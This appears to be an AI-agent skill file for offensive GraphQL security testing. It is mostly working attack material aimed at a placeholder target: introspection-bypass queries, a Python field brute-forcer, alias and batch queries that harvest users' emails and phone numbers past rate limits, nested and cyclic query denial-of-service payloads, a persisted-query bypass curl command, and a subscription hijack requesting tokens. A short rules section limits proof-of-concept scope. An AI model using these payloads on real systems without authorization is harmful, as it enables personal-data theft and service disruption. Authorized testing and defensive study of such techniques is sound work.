---
name: graphql-test
description: >
  GraphQL API security testing v2. Coverage: introspection bypass (6 techniques),
  clairvoyance field brute-force, alias-based rate limit bypass, batch query IDOR,
  depth/cyclic query DoS, persisted queries bypass, field suggestion leak, and
  subscription hijacking.
metadata:
  tags: "graphql,introspection,schema,clairvoyance,batching,dos,rate-limit,over-fetching,subscription"
  category: "offensive-security"
---

# GraphQL Testing v2 — Deep Coverage

## 0. Detection

```bash
# Common endpoints
/graphql /graphiql /gql /v1/graphql /api/graphql
/query /playground /graphql/console /graphql-explorer

# Quick confirmation
curl POST https://{target}/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __typename }"}'
# → {"data":{"__typename":"Query"}} = GraphQL confirmed

# Check for GET support (easier to exploit)
curl "https://{target}/graphql?query=%7B__typename%7D"
```

## 1. Introspection — 6 Bypass Techniques

### Technique 1: Standard

```graphql
{ __schema { types { name fields { name type { name kind ofType { name } } } } } }
```

### Technique 2: Proxied via __typename

```graphql
fragment FullType on __Type {
  kind name description
  fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } }
  inputFields { ...InputValue }
}
fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name } } }
fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue }
query IntrospectionQuery { __schema { queryType { name } mutationType { name } types { ...FullType } } }
```

### Technique 3: Per-Type Probing (if full introspection blocked)

```graphql
{ __type(name: "User") { name fields { name type { name kind } } } }
{ __type(name: "Query") { name fields { name args { name type { name } } } } }
```

Enumerate common type names: User, Query, Mutation, Post, Comment, Order, Product,
Account, Profile, Token, AuthPayload, Node, Edge, Connection, PageInfo.

### Technique 4: Field Suggestions (error-based)

```graphql
{ user { THIS_DOES_NOT_EXIST } }
# Response: "Cannot query field 'THIS_DOES_NOT_EXIST' on type 'User'.
#            Did you mean 'email', 'username', or 'phone'?"
# → Field names leaked through error suggestions!
```

### Technique 5: Fragment-based Field Discovery

```graphql
query { ... on Query { __typename } }
query { user(id: 1) { ... on User { __typename } } }
```

### Technique 6: Directives Probing

```graphql
{ user(id: 1) { id @skip(if: true) email } }
{ user(id: 1) { id @include(if: false) email } }
```

## 2. Clairvoyance — Field Brute-force (Introspection Disabled)

When introspection is completely blocked, brute-force field names using
common patterns + error-based suggestions:

```python
import requests

ENDPOINT = "https://{target}/graphql"
COMMON_FIELDS = [
    "id", "name", "email", "username", "password", "phone", "role",
    "token", "apiKey", "secret", "createdAt", "updatedAt", "isAdmin",
    "isActive", "verified", "balance", "credit", "organization",
    "posts", "comments", "orders", "profile", "settings",
    "firstName", "lastName", "avatar", "bio", "address", "city",
    "country", "zipCode", "birthDate", "gender", "subscription",
]

COMMON_QUERIES = [
    "user", "users", "me", "viewer", "currentUser", "account",
    "post", "posts", "comment", "comments", "order", "orders",
    "product", "products", "node", "search",
]

def brute_force_fields(target_type, query_root):
    found = []
    headers = {"Content-Type": "application/json"}
    
    for field in COMMON_FIELDS:
        payload = f"{{ {query_root} {{ {field} }} }}"
        resp = requests.post(ENDPOINT,
            headers=headers,
            json={"query": payload})
        
        if "Cannot query field" not in resp.text:
            found.append(field)
            print(f"[FOUND] {target_type}.{field}")
    
    return found

# For each discovered type, brute force its fields
for q in COMMON_QUERIES:
    brute_force_fields(q, q)
```

## 3. Alias-Based Rate Limit Bypass

```graphql
# Instead of 100 separate requests (rate-limited):
query {
  u1: user(id: 1) { id email }
  u2: user(id: 2) { id email }
  u3: user(id: 3) { id email }
  # ... up to 100+
  u100: user(id: 100) { id email }
}
# → ONE request, 100 users' data. Bypasses per-minute rate limiting.
```

## 4. Batch Query IDOR

```python
# Send an ARRAY of queries in ONE HTTP request
import json

batch = []
for uid in range(1, 101):
    batch.append({
        "query": f"query {{ user(id: {uid}) {{ id email phone }} }}"
    })

resp = requests.post(
    "https://{target}/graphql",
    headers={"Content-Type": "application/json"},
    json=batch,
)

# Response: array of 100 responses → extract all user data
```

## 5. Deep/Cyclic Query DoS

### Depth Attack

```graphql
query DeepAttack {
  users {
    posts {
      comments {
        author {
          posts {
            comments {
              author {
                posts {
                  comments {
                    author { id name }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}
```

### Cyclic Attack (Circular References)

```graphql
query CycleAttack {
  node(id: "1") {
    ...A
  }
}
fragment A on Node {
  ... on User { friends { ...A } }
  ... on Post { author { ...A } }
}
```

## 6. Persisted Queries Bypass

```bash
# Some GraphQL servers use persisted queries (APQ):
# Client sends hash, server looks up pre-registered query.
# Bypass: send hash + query body together.

curl POST https://{target}/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "extensions": {
      "persistedQuery": {
        "version": 1,
        "sha256Hash": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
      }
    },
    "query": "{ __schema { types { name } } }"
  }'
# If APQ not enforced, the fallback query IS executed → introspection leak!
```

## 7. Subscription Hijacking

```graphql
# GraphQL subscriptions over WebSocket
# Test: subscribe to events you shouldn't have access to

# Connect via WebSocket:
wss://{target}/graphql

# Send subscription initiation:
{"type": "connection_init", "payload": {}}
{"type": "start", "id": "1",
 "payload": {"query": "subscription { userUpdated { id email token } }"}}

# If you receive updates → subscription auth bypass
```

## 8. Automated Test Sequence

```python
# Full GraphQL test checklist

def test_graphql(target):
    endpoint = find_endpoint(target)  # /graphql, /gql, etc.
    
    # 1. Confirmation
    assert graphql_typename(endpoint)
    
    # 2. Introspection (6 techniques)
    schema = try_introspection(endpoint)
    if not schema:
        schema = try_per_type(endpoint)
    if not schema:
        schema = try_clairvoyance(endpoint)
    
    # 3. If schema obtained:
    sensitive_fields = find_sensitive(schema)  # password, token, apiKey
    id_fields = find_id_fields(schema)         # user(id:), post(id:)
    
    # 4. IDOR test
    for field in id_fields:
        test_idor(endpoint, field, sensitive_fields)
    
    # 5. Over-fetching
    test_depth(endpoint, max_depth=8)
    
    # 6. Alias rate limit bypass
    test_alias_bypass(endpoint, id_fields)
    
    # 7. Batch query abuse
    test_batching(endpoint)
    
    # 8. Subscription test (if WebSocket)
    test_subscription(endpoint)
```

## 9. Output

```
findings/
└── graphql/
    ├── _schema.json               # Full GraphQL schema (if obtained)
    ├── _sensitive_fields.json    # Fields containing PII/tokens
    ├── _idor_results.json        # IDOR test results
    ├── _alias_bypass.json        # Alias-based rate limit bypass results
    └── _subscription_test.json   # Subscription auth bypass results
```

## 10. Rules

```
⛔ Never extract more than 5 users' data for PoC
⛔ Depth attacks: start shallow, increase gradually
⛔ Batching: test with 10 first, not 1000
⛔ Subscriptions: use your own test account events
```
